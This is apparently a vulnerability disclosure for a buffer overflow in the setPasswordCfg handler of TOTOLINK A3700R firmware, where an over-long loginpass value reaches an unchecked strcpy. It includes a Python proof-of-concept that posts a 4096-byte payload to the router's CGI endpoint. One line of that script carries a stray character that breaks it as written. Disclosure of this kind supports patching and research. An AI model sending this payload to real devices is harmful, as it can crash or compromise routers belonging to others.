## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/data/upload/20200728/311b3ec5b0a8e61af298aebda158ec9b.zip

## Affected version

A3700R V9.1.2u.5822_B20200513

## Vulnerability details

In the A3700R V9.1.2u.5822_B20200513 firmware has a buffer overflow vulnerability in the `setPasswordCfg` function. In function `setWizardCfg`, the `v3` variable receives the `loginpass` parameter from a POST request. However, since the user can control the input of `loginpass`, the statement `strcpy(v10, v4);` in function  `setPasswordCfg`  can cause a buffer overflow injection vulnerability.

![image-20240719102540863](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719102540863.png)

![image-20240719102527826](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719102527826.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
payload = 'a'*0x1000
data = {"topicurl":"setWizardCfg", "loginpass": payload}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)a

data = {"topicurl":"setPasswordCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719102729994](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719102729994.png)
